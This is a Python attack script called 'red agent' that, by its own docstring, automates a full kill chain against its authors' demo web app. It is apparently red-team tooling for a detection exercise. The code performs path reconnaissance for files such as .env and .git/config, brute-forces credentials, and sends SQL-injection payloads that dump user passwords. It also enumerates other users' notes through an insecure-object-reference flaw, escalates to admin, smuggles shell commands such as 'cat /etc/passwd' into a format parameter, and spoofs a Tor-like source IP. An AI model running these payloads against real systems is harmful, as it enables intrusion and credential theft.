#!/usr/bin/env python3
"""Parry red agent — autonomous attacker against OUR OWN demo target only.

Stages:
  recon      — path discovery sweep
  brute      — credential guessing on /login until bob:hunter2 lands
  sqli       — UNION injection in /api/search
  idor       — iterate /api/notes/<id> across other users' private notes
  bac        — /api/admin/users as a non-admin (client-side role check)
  privesc    — log in as admin with any dumped password
  cmdinj     — /api/export?fmt=txt;id
  exfil      — pull the loot repeatedly (beaconing pattern)

Usage:
  red_agent.py http://TARGET:8080 [--fast] [--stages recon,brute,sqli] [--delay 1.2]
Default (no --stages): the full kill chain, in order.
"""
import random
import sys
import time

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("--") else "http://localhost:8080"
FAST = "--fast" in sys.argv


def _arg(flag, default=None):
    for a in sys.argv:
        if a.startswith(flag + "="):
            return a.split("=", 1)[1]
    if flag in sys.argv:
        i = sys.argv.index(flag)
        if i + 1 < len(sys.argv):
            return sys.argv[i + 1]
    return default


DELAY = _arg("--delay")
DELAY = float(DELAY) if DELAY else None          # explicit base pace (seconds)
S = requests.Session()
S.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
ATTACKER_IP = _arg("--ip", "185.220.101.45")   # looks like a Tor exit; distinct from legit users
S.headers["X-Forwarded-For"] = ATTACKER_IP
_loot = [None]
_logged_in = [False]


def pause(lo=1.2, hi=2.6):
    if DELAY is not None:
        time.sleep(DELAY + random.uniform(0, DELAY * 0.4))
    elif FAST:
        time.sleep(0.2)
    else:
        time.sleep(random.uniform(lo, hi))


def step_sleep(lo=0.4, hi=1.0):
    if DELAY is not None:
        time.sleep(max(0.15, DELAY * 0.5))
    elif FAST:
        time.sleep(0.1)
    else:
        time.sleep(random.uniform(lo, hi))


def log(stage, msg):
    print(f"[red:{stage}] {msg}", flush=True)


def ensure_login():
    """Authed stages need a session; log in as bob if we haven't already."""
    if _logged_in[0]:
        return
    r = S.post(BASE + "/login", data={"username": "bob", "password": "hunter2"}, timeout=10)
    _logged_in[0] = r.status_code == 200
    log("login", f"session as bob -> {r.status_code}")


def stage_recon():
    paths = ["/", "/robots.txt", "/api/health", "/api", "/admin", "/login",
             "/api/notes", "/api/search", "/api/export", "/api/admin/users",
             "/backup.zip", "/.env", "/.git/config", "/api/v2/health"]
    for p in paths:
        r = S.get(BASE + p, timeout=10)
        log("recon", f"{p} -> {r.status_code}")
        step_sleep(0.3, 0.8)


def stage_brute():
    guesses = [("admin", "admin"), ("admin", "password"), ("admin", "123456"),
               ("root", "toor"), ("alice", "alice"), ("bob", "password"),
               ("bob", "letmein"), ("bob", "qwerty"), ("bob", "hunter2")]
    for u, p in guesses:
        r = S.post(BASE + "/login", data={"username": u, "password": p}, timeout=10)
        log("brute", f"{u}:{p} -> {r.status_code}")
        if r.status_code == 200:
            _logged_in[0] = True
            log("brute", f"VALID CREDS {u}:{p}")
            return
        step_sleep(0.4, 1.0)


def stage_sqli():
    ensure_login()
    for q in ["'", "' OR '1'='1", "x' UNION SELECT 1,2,3--",
              "x' UNION SELECT id,username,password FROM users--"]:
        r = S.get(BASE + "/api/search", params={"q": q}, timeout=10)
        log("sqli", f"q={q!r} -> {r.status_code} {r.text[:110]!r}")
        if r.status_code == 200 and "N0teNest" in r.text:
            _loot[0] = r.json().get("results")
        pause()


def stage_idor():
    ensure_login()
    for nid in range(1, 9):
        r = S.get(f"{BASE}/api/notes/{nid}", timeout=10)
        log("idor", f"note {nid} -> {r.status_code} {r.text[:100]!r}")
        step_sleep(0.5, 1.2)


def stage_bac():
    ensure_login()
    r = S.get(BASE + "/api/admin/users", timeout=10)
    log("bac", f"/api/admin/users -> {r.status_code} {r.text[:150]!r}")


def stage_privesc():
    admin_pw = next((row["body"] for row in (_loot[0] or []) if row.get("title") == "admin"), None)
    if not admin_pw:
        log("privesc", "no admin pw dumped; skipping")
        return
    r = S.post(BASE + "/login", data={"username": "admin", "password": admin_pw}, timeout=10)
    log("privesc", f"admin login -> {r.status_code}")


def stage_cmdinj():
    ensure_login()
    for fmt in ["txt", "txt;id", "txt;cat /etc/passwd", "txt;uname -a"]:
        r = S.get(BASE + "/api/export", params={"fmt": fmt}, timeout=10)
        log("cmdinj", f"fmt={fmt!r} -> {r.status_code} {r.text[:110]!r}")
        pause()


def stage_exfil():
    ensure_login()
    for i in range(6):
        r = S.get(f"{BASE}/api/notes/{3 + (i % 2)}", timeout=10)
        log("exfil", f"beacon {i} -> {r.status_code}")
        pause(2, 4)


STAGES = {
    "recon": stage_recon, "brute": stage_brute, "bruteforce": stage_brute,
    "sqli": stage_sqli, "idor": stage_idor, "bac": stage_bac,
    "privesc": stage_privesc, "cmdinj": stage_cmdinj, "exfil": stage_exfil,
}
DEFAULT = ["recon", "brute", "sqli", "idor", "bac", "privesc", "cmdinj", "exfil"]


def main():
    sel = _arg("--stages")
    order = [s.strip() for s in sel.split(",") if s.strip()] if sel else DEFAULT
    print(f"[red] engaging {BASE} — stages: {','.join(order)}", flush=True)
    for name in order:
        fn = STAGES.get(name)
        if not fn:
            continue
        try:
            fn()
        except requests.RequestException as e:
            log(name, f"request failed ({e}) — possibly blocked by defender. continuing")
        pause()
    print("[red] attack complete", flush=True)


if __name__ == "__main__":
    main()
